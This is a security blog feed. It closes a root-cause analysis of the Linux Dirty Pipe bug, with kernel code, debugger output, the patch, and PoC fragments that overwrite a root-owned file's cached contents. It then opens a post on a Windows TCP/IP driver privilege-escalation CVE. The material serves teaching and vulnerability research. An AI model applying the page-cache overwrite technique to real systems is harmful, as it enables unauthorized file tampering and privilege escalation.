} &lt;span style="color:#66d9ef">while&lt;/span> (iov_iter_count(iter) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> iocb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ki_pos &lt;span style="color:#f92672">&amp;lt;&lt;/span> isize &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>error);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/mm/filemap.c#L2645">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>In this function the actual copying (again no real byte-for-byte copy&amp;hellip; see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to &lt;code>copy_folio_to_iter()&lt;/code>. Note that a &lt;a href="https://lwn.net/Articles/849538/">folio&lt;/a> is not quite the same as a page, but for our purposes this doesn&amp;rsquo;t matter.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">copied &lt;span style="color:#f92672">=&lt;/span> copy_folio_to_iter(folio, offset, bytes, iter);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Besides, however, that if we look closer at the implementation of this operation in &lt;code>copy_page_to_iter_pipe()&lt;/code>, we notice that the data is not actually copied at all!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> size_t &lt;span style="color:#a6e22e">copy_page_to_iter_pipe&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page, size_t offset, size_t bytes,
&lt;span style="color:#66d9ef">struct&lt;/span> iov_iter &lt;span style="color:#f92672">*&lt;/span>i)
{
...
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pipe;
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>buf;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> p_mask &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ring_size &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i_head &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>head;
size_t off;
...
off &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>iov_offset;
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs[i_head &lt;span style="color:#f92672">&amp;amp;&lt;/span> p_mask];
&lt;span style="color:#66d9ef">if&lt;/span> (off) {
&lt;span style="color:#66d9ef">if&lt;/span> (offset &lt;span style="color:#f92672">==&lt;/span> off &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page &lt;span style="color:#f92672">==&lt;/span> page) {
&lt;span style="color:#75715e">/* merge with the last one */&lt;/span>
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">+=&lt;/span> bytes;
i&lt;span style="color:#f92672">-&amp;gt;&lt;/span>iov_offset &lt;span style="color:#f92672">+=&lt;/span> bytes;
&lt;span style="color:#66d9ef">goto&lt;/span> out;
}
i_head&lt;span style="color:#f92672">++&lt;/span>;
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs[i_head &lt;span style="color:#f92672">&amp;amp;&lt;/span> p_mask];
}
...
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ops &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>page_cache_pipe_buf_ops;
get_page(page);
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>page &lt;span style="color:#f92672">=&lt;/span> page;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>offset &lt;span style="color:#f92672">=&lt;/span> offset;
buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">=&lt;/span> bytes;
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/lib/iov_iter.c#L382">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>We first try to &amp;lsquo;append&amp;rsquo; the current copy operation to an earlier one by increasing the &lt;code>length&lt;/code> of the &lt;code>pipe_buffer&lt;/code> at &lt;code>head&lt;/code>. In case this is not possible, we simply advance the &lt;code>head&lt;/code> and put a &lt;em>reference to&lt;/em> the page we copy into its &lt;code>page&lt;/code> field while making sure that &lt;code>offset&lt;/code> and &lt;code>length&lt;/code> are set correctly. Indeed, the idea behind the efficiency of &lt;code>sys_splice&lt;/code> is to implement it as a &lt;em>zero-copy&lt;/em> operation, where pointers and reference counts are used instead of actually duplicating the data.&lt;/p>
&lt;p>Clearly this code potentially reuses the &lt;code>pipe_buffer&lt;/code>s (&lt;code>buf = &amp;amp;pipe-&amp;gt;bufs[i_head &amp;amp; p_mask]&lt;/code>), and thus all fields &lt;em>must&lt;/em> be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the &lt;code>flags&lt;/code> is missing. As pointed out by Max Kellermann, it was missing since the &lt;a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit&lt;/a> that introduced this function.&lt;/p>
&lt;h3 id="debugger-1">Debugger&lt;/h3>
&lt;p>We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,&lt;/p>
&lt;pre tabindex="0">&lt;code>struct file at 0xffff8881045b0800
&amp;gt; 'f_mapping': 0xffff8881017d9460
&amp;gt; filename: target_file
struct address_space at 0xffff8881017d9460
&amp;gt; 'a_ops': 0xffffffff82226ce0 &amp;lt;ext4_aops&amp;gt;
&amp;gt; 'i_pages.xa_head' : 0xffffea0004156880
struct page at 0xffffea0004156880
&amp;gt; virtual: 0xffff8881055a2000
&amp;gt; data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>and this is the state of the pipe after splicing&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 2
&amp;gt; 'tail': 1
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea0004156880 &amp;lt;- same page as before
&amp;gt; 'offset': 0
&amp;gt; 'len': 5
&amp;gt; 'ops': 0xffffffff8221cee0 &amp;lt;page_cache_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE &amp;lt;- flag still set... oopsie :)
&lt;/code>&lt;/pre>&lt;p>The data pointer in the &lt;code>struct address_space&lt;/code> (which represents the page cache&amp;rsquo;s view on the &lt;code>target_file&lt;/code>) and the &lt;code>pipe_buffer&lt;/code> at &lt;code>head&lt;/code> are equal, while the offset and length reflect what our PoC specified in its call to &lt;code>splice&lt;/code>. Note that we are reusing the buffer we emptied earlier, re-initializing all fields &lt;em>but&lt;/em> the flags.&lt;/p>
&lt;h2 id="whats-the-actual-problem">What&amp;rsquo;s the Actual Problem?&lt;/h2>
&lt;p>At this point the problem becomes evident. With &lt;strong>anonymous&lt;/strong> pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag. With the &lt;strong>file-backed buffers&lt;/strong>, created by splicing, this should not be allowed by the kernel since those pages are &amp;ldquo;owned&amp;rdquo; by the page cache and not by the pipe.&lt;/p>
&lt;p>Thus, when we &lt;code>splice()&lt;/code> the data from a file into a pipe we would have to set &lt;code>buf-&amp;gt;flags = 0&lt;/code> to indicate that it is not okay to append data to an already existing - not fully written - page (&lt;code>buf-&amp;gt;page&lt;/code>) since this page belongs to the page cache (the file). When we &lt;code>pipe_write()&lt;/code> (or in our program just &lt;code>write()&lt;/code>) again we write into the page cache&amp;rsquo;s page because the check &lt;code>buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE&lt;/code> is &lt;code>true&lt;/code> (see &lt;code>pipe_write&lt;/code> above if you forgot about that part).&lt;/p>
&lt;p>So the main problem is that we start with an anonymous pipe that will then be &amp;ldquo;turned into&amp;rdquo; a file-backed pipe (not the whole pipe but some buffers) by the &lt;code>splice()&lt;/code> but the pipe does not get this information since &lt;code>buf-&amp;gt;flags&lt;/code> is not set to &lt;code>0&lt;/code> and thus the merging is still allowed.&lt;/p>
&lt;p>The &lt;a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">patch&lt;/a> is simply adding the missing initialization.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
&lt;span style="color:#f92672">--- a/lib/iov_iter.c
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/lib/iov_iter.c
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
&lt;/span>&lt;span style="color:#75715e">&lt;/span>return 0;
buf-&amp;gt;ops = &amp;amp;page_cache_pipe_buf_ops;
&lt;span style="color:#a6e22e">+ buf-&amp;gt;flags = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> get_page(page);
buf-&amp;gt;page = page;
buf-&amp;gt;offset = offset;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see above, our PoC arranged for the &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to write() into page cache&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (write(pipefds[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;pwned by user&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">13&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L81">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Back in the debugger, we can see that the final invocation of &lt;code>pipe_write()&lt;/code> appends to the partially filled &lt;code>pipe_buffer&lt;/code> that is backed by the page cache.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct address_space at 0xffff8881017d9460
&amp;gt; 'a_ops': 0xffffffff82226ce0 &amp;lt;ext4_aops&amp;gt;
&amp;gt; 'i_pages.xa_head' : 0xffffea0004156880
struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 2
&amp;gt; 'tail': 1
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': 0xffffea0004156880
&amp;gt; 'offset': 0
&amp;gt; 'len': 18
&amp;gt; 'ops': 0xffffffff8221cee0 &amp;lt;page_cache_pipe_buf_ops&amp;gt;
&amp;gt; 'flags': PIPE_BUF_FLAG_CAN_MERGE
struct page at 0xffffea0004156880
&amp;gt; virtual: 0xffff8881055a2000
&amp;gt; data: b'File pwned by user!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>Here we can see that &lt;code>owned by root&lt;/code> (starting at index 5 of &amp;ldquo;File owned by root!&amp;quot;) has been overwritten with &lt;code>pwned by user&lt;/code> in the page cache.&lt;/p>
&lt;p>In the shell we can confirm that the file contents changed for all processes on the system&lt;/p>
&lt;pre tabindex="0">&lt;code>user@lkd-debian-qemu:~$ ./poc
user@lkd-debian-qemu:~$ cat target_file
File pwned by user!
user@lkd-debian-qemu:~$ exit
root@lkd-debian-qemu:~# echo 1 &amp;gt; /proc/sys/vm/drop_caches
[ 232.397273] bash (203): drop_caches: 1
root@lkd-debian-qemu:~# su user
user@lkd-debian-qemu:~$ cat target_file
File owned by root
&lt;/code>&lt;/pre>&lt;p>You can also see that the changes to the file&amp;rsquo;s page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that&amp;rsquo;s the purpose of the page cache).&lt;/p>
&lt;h3 id="limitations">Limitations&lt;/h3>
&lt;p>There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:&lt;/p>
&lt;blockquote>
&lt;p>the attacker must have read permissions (because it needs to splice() a page into a pipe)&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)&lt;/p>
&lt;/blockquote>
&lt;h2 id="approaches-to-understand-the-bug">Approaches to Understand the Bug&lt;/h2>
&lt;h3 id="top-down-vs-bottom-up-vs-hybrid">Top Down vs. Bottom Up vs. Hybrid&lt;/h3>
&lt;p>Given a PoC and a patch there are different approaches to investigate the vulnerability.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Top Down&lt;/strong>: find the &lt;code>splice()&lt;/code>, &lt;code>write()&lt;/code>, &lt;code>read()&lt;/code> system call implementation and go deeper.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Bottom Up&lt;/strong>: have a look at the fix: &lt;a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
&lt;span style="color:#f92672">--- a/lib/iov_iter.c
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/lib/iov_iter.c
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
&lt;/span>&lt;span style="color:#75715e">&lt;/span> return 0;
buf-&amp;gt;ops = &amp;amp;page_cache_pipe_buf_ops;
&lt;span style="color:#a6e22e">+ buf-&amp;gt;flags = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> get_page(page);
buf-&amp;gt;page = page;
buf-&amp;gt;offset = offset;
&lt;span style="color:#75715e">@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> break;
buf-&amp;gt;ops = &amp;amp;default_pipe_buf_ops;
&lt;span style="color:#a6e22e">+ buf-&amp;gt;flags = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> buf-&amp;gt;page = page;
buf-&amp;gt;offset = 0;
buf-&amp;gt;len = min_t(ssize_t, left, PAGE_SIZE);
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>find &lt;code>lib/iov_iter.c&lt;/code> (more concrete the functions &lt;code>copy_page_to_iter_pipe()&lt;/code> and &lt;code>push_pipe()&lt;/code>) and your way back to the system calls.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Hybrid&lt;/strong>: start from &lt;code>splice()&lt;/code> system call but know where we will end (either of the patched functions from above)&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="linux-kernel-source">Linux Kernel Source&lt;/h3>
&lt;p>Access to the source code:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/torvalds/linux">https://github.com/torvalds/linux&lt;/a> + ctags + cscope (&lt;code>make cscope tags&lt;/code>) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel&amp;rsquo;s size!)&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source">https://elixir.bootlin.com/linux/v5.17.9/source&lt;/a> (cross references already created + no need for extra tools)&lt;/li>
&lt;/ul>
&lt;p>When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is &lt;em>impossible&lt;/em> to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:&lt;/p>
&lt;ul>
&lt;li>lots of error checking: in general &lt;em>very&lt;/em> interesting, however, here we ignore it (i.e. &lt;code>return -EXYZ&lt;/code> code paths)&lt;/li>
&lt;li>many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well.&lt;/li>
&lt;li>structures full of function pointers:
&lt;ul>
&lt;li>for example, look under &amp;ldquo;Referenced in [&amp;hellip;] files&amp;rdquo; on &lt;a href="https://elixir.bootlin.com">https://elixir.bootlin.com&lt;/a>&lt;/li>
&lt;li>&amp;ldquo;decide&amp;rdquo; for some implementation (in our case ext2 file system)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>conditional compilation depending on:
&lt;ul>
&lt;li>compile time options: check the config files you used for your build &lt;code>.config&lt;/code>&lt;/li>
&lt;li>processor architecture: go for &lt;code>x86-64&lt;/code> if present, else take the generic version&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>A detailed and streamlined analysis of any bug makes it seem shallow, however, don&amp;rsquo;t get fooled by that impression. Making sense of the bug requires a conceptual understanding of multiple interacting subsystems of the Linux kernel. A root cause analysis without a PoC, blog post, or patch at hand would be a tricky task. In general, the nature of this bug makes it a great opportunity to learn about the Linux kernel. A missing initialization is a welcome diversion from the ubiquitous memory corruption issues (that a lot of exploit developers love ;)). Furthermore, in contrast to those kind of vulnerabilities, the exploitation of this one is almost trivial, stable, and it works across a huge range of Linux distributions. Maybe you got motivated to check out some more complex vulnerabilities / exploits or the Linux kernel yourself :).&lt;/p></content></item><item><title>Exploiting CVE-2021-43247</title><link>https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/</link><pubDate>Thu, 02 Jun 2022 10:59:55 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/06/exploiting_cve_2021_43247/</guid><description>In this blog post I will go in depth into the inner workings of CVE-2021-43247, which was fixed on the 14th of December 2021. This bug was classified as &amp;ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability&amp;rdquo;. The vulnerability itself was probably dormant for a long time, but became exploitable when the AF_UNIX address family was first introduced in 2019.
I will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers, what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.</description><content>&lt;p>In this blog post I will go in depth into the inner workings of &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43247">CVE-2021-43247&lt;/a>, which was fixed on the 14th of December 2021.
This bug was classified as &amp;ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability&amp;rdquo;.
The vulnerability itself was probably dormant for a long time, but became exploitable when the &lt;code>AF_UNIX&lt;/code> address family
was first introduced in 2019.&lt;/p>
&lt;p>I will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers,
what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.&lt;/p>
&lt;h2 id="the-goal--what-is-an-lpe-local-privilege-escalation">The goal / what is an LPE (Local Privilege Escalation)&lt;/h2>
&lt;p>A Local Privilege Escalation (sometimes also called Elevation of Privilege or EoP) is an exploit which obtains some privilege
that it is not supposed to be able to get. In the traditional cases (as in this one) this means we start out with at normal
user shell and end up with administrator access. On Linux this would be about obtaining a root shell.
This is usually done through a bug in a privileged process, a bug in a driver or a bug in the operating system itself.&lt;/p>
&lt;p>As the CVE description tells us, we are dealing with a bug in the TCP/IP driver.&lt;/p>
&lt;h2 id="what-are-drivers-and-how-does-user-space-communicate-with-them">What are drivers and how does user space communicate with them?&lt;/h2>
&lt;p>Drivers are simply &lt;a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">PE files&lt;/a>, which the kernel loads into the kernel address space.
PE (Portable Executable) is the executable file format used by Windows, it&amp;rsquo;s used by &amp;ldquo;.exe&amp;rdquo; and &amp;ldquo;.dll&amp;rdquo; files.
Drivers usually have the file extension &amp;ldquo;.sys&amp;rdquo;, but there are also library drivers which also get the &amp;ldquo;.dll&amp;rdquo; file extension.
Most drivers are contained in the &amp;ldquo;C:\windows\system32\drivers&amp;rdquo; directory.
What drivers are loaded on system startup is determined by the registry and the physical devices available to the system.&lt;/p>
&lt;p>User space can communicate with the loaded drivers using kernel system calls (or syscalls for short). For example, consider the program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// blog_socket.c - small example program used in this blog
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;winsock.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;span style="color:#75715e">// Initialize WinSock
&lt;/span>&lt;span style="color:#75715e">&lt;/span> WSAStartup(MAKEWORD(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>), &lt;span style="color:#f92672">&amp;amp;&lt;/span>(WSADATA){&lt;span style="color:#ae81ff">0&lt;/span>});
&lt;span style="color:#75715e">// Create a TCP/IPv4 socket.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> SOCKET Socket &lt;span style="color:#f92672">=&lt;/span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
&lt;span style="color:#75715e">// Bind the socket to any address
&lt;/span>&lt;span style="color:#75715e">&lt;/span> bind(Socket, &lt;span style="color:#f92672">&amp;amp;&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> sockaddr){AF_INET}, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> sockaddr));
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we can observe the following call stack:&lt;/p>
&lt;pre tabindex="0">&lt;code>00 ntdll!NtCreateFile
01 mswsock!SockSocket+0x56e
02 mswsock!WSPSocket+0x23a
03 WS2_32!WSASocketW+0x130
04 WS2_32!socket+0x6e
05 blog_socket!main+0x84
&lt;/code>&lt;/pre>&lt;p>&lt;code>ntdll!NtCreateFile&lt;/code> is the function that actually transitions into the kernel address space.
The assembly for all &lt;code>ntdll!NtXxx&lt;/code> functions looks something like the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">NtCreateFile:
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">r10&lt;/span>, &lt;span style="color:#66d9ef">rcx&lt;/span> &lt;span style="color:#75715e">; load the first argument into r10, as the syscall
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; instruction uses rcx as the return location
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span> &lt;span style="color:#75715e">; load the syscall value into eax (0x55 is &amp;#39;NtCreateFile&amp;#39;)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">test&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span> &lt;span style="color:#66d9ef">ptr&lt;/span> [.&lt;span style="color:#66d9ef">Running32Bit&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">; check if we are running a 32bit executable
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">jnz&lt;/span> &lt;span style="color:#66d9ef">.Syscallx86&lt;/span>
&lt;span style="color:#75715e">; syscall transitions into the kernel.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">systcall&lt;/span>
&lt;span style="color:#a6e22e">ret&lt;/span>
.Syscallx86:
&lt;span style="color:#75715e">; x86 does not have a syscall instruction, use int 0x2e instead of syscall.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> &lt;span style="color:#ae81ff">0x2e&lt;/span>
&lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We will only focus on the x64 case here. The syscall instruction loads the new instruction pointer from a
specialized hardware registers (called a model specific register or MSR). Namely, the MSR &lt;code>IA32_LSTAR&lt;/code>.
It also stores the &lt;code>return&lt;/code> address (in this case the address of the &lt;code>ret&lt;/code> instruction) into &lt;code>rcx&lt;/code> and sets the privilege
level of the processor to 0. This is why kernel mode is sometimes referred to as ring 0.&lt;/p>
&lt;p>When the processor is running at privilege level 0, it can access kernel space memory.
Here it is important to know that the address space does not change, but at non-zero privilege level the processor
faults when it is accessing a page which does not have the &lt;code>USER&lt;/code> bit set in the page table.&lt;/p>
&lt;p>In Windows 10 the &lt;code>IA32_LSTAR&lt;/code> MSR points to the function &lt;code>nt!KiSystemCall64&lt;/code>, which first establishes a stack pointer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">KiSystemCall64:
&lt;span style="color:#a6e22e">swapgs&lt;/span> &lt;span style="color:#75715e">; load saved kernel thread locals from some MSR
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.user_stack&lt;/span>], &lt;span style="color:#66d9ef">rsp&lt;/span> &lt;span style="color:#75715e">; save user stack, in the kernel thread locals
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">rsp&lt;/span>, &lt;span style="color:#66d9ef">gs&lt;/span>:[&lt;span style="color:#66d9ef">gs.kernel_stack&lt;/span>] &lt;span style="color:#75715e">; load kernel space stack, from the thread locals
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">; ... from here we are just in kernel space, and can do whatever we want
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; e.g. Save all the registers and then call the according NtXxx
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">; kernel function depending on eax.
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The kernel then figures out what kernel function was requested by looking at &lt;code>eax&lt;/code> and transitions to it.
In this case we end up in &lt;code>nt!NtCreateFile&lt;/code> (on the kernel side).&lt;/p>
&lt;pre tabindex="0">&lt;code>00 nt!NtCreateFile &amp;lt;-- Kernel space function
01 nt!KiSystemServiceCopyEnd+0x25
02 ntdll!NtCreateFile+0x14 &amp;lt;-- User space function
03 mswsock!SockSocket+0x4ec
04 mswsock!WSPSocket+0x233
05 WS2_32!WSASocketW+0x1be
06 WS2_32!socket+0x9b
&lt;/code>&lt;/pre>&lt;p>Note that the address space is still the same, as in user space. The difference being that we are now allowed
to access kernel memory. The arguments to &lt;code>nt!NtCreateFile&lt;/code> are unchanged from the arguments &lt;code>ntdll!NtCreateFile&lt;/code>
received. The kernel very carefully validates all arguments and copies them safely to kernel space memory.&lt;/p>
